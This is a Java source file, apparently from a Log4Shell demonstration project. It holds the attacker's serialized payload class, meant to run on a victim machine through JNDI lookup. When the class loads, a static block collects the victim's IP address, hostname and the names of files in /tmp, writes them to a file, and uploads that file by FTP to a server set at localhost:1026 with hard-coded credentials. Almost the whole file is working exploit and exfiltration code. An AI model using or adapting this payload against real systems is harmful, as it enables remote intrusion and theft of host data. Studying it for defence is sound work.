package com.demo.exploit.log4jshell.attacker.payload;

import java.io.*;
import java.net.InetAddress;
import java.net.URL;
import java.net.URLConnection;
import java.util.Date;

/**
 * A Java File that an attacker will use for sending it over the network in the byte stream fashion to Victims computer.
 *
 * @author karanratra on 12/20/21
 */
public class Exploit implements java.io.Serializable {
    /**
     * Use serialVersionUID from JNDI 1.1.1 for interoperability
     */
    private static final long serialVersionUID = -1673475790065791735L;

    static {

        try {
            BufferedWriter out = null;
            InetAddress ip = InetAddress.getLocalHost();
            String hostname = ip.getHostName();

            System.out.println("Your current IP address : " + ip);
            System.out.println("Your current Hostname : " + hostname);

            String ftpUrl = "ftp://%s:%s@%s/%s;type=i";
            String host = "localhost:1026";
            String user = "user";
            String pass = "12345";

            String fileName = hostname + ".txt";
            String filePath = "/tmp/" + fileName;
            String uploadPath = "ftpuploads/FTP_" + fileName;
            //String uploadPath = "ftpuploads/FTP_" + fileName;

            File folder = new File("/tmp");
            File[] listOfFiles = folder.listFiles();

            StringBuilder stringBuilder = new StringBuilder();
            for (File file : listOfFiles) {
                if (file.isFile()) {
                    stringBuilder.append(file.getName() + "\n");
                }
            }

            String str = "World";
            BufferedWriter writer = new BufferedWriter(new FileWriter(filePath, false));
            writer.write("*************Log4J Shell Exploit : Start*************");
            writer.newLine();
            writer.write("Current Date : " + new Date());
            writer.newLine();
            writer.write("IP Address : " + ip);
            writer.newLine();
            writer.write("HostName : " + hostname);
            writer.newLine();
            writer.write("Contents of directory /tmp".toString());
            writer.write(stringBuilder.toString());
            writer.write("*************Log4J Shell Exploit : End*************");
            writer.newLine();
            writer.close();

            ftpUrl = String.format(ftpUrl, user, pass, host, uploadPath);
            System.out.println("Upload URL: " + ftpUrl);


            URL url = new URL(ftpUrl);
            URLConnection conn = url.openConnection();
            OutputStream outputStream = conn.getOutputStream();
            FileInputStream inputStream = new FileInputStream(filePath);

            byte[] buffer = new byte[4096];
            int bytesRead = -1;
            while ((bytesRead = inputStream.read(buffer)) != -1) {
                outputStream.write(buffer, 0, bytesRead);
            }

            inputStream.close();
            outputStream.close();

            System.out.println("File uploaded to remote FTP Server!!");


        } catch (IOException ex) {
            ex.printStackTrace();
        }finally {
            System.out.println("Log4J Exploit completed !!");
        }
    }
    public static void main(String[] args) {
    }
}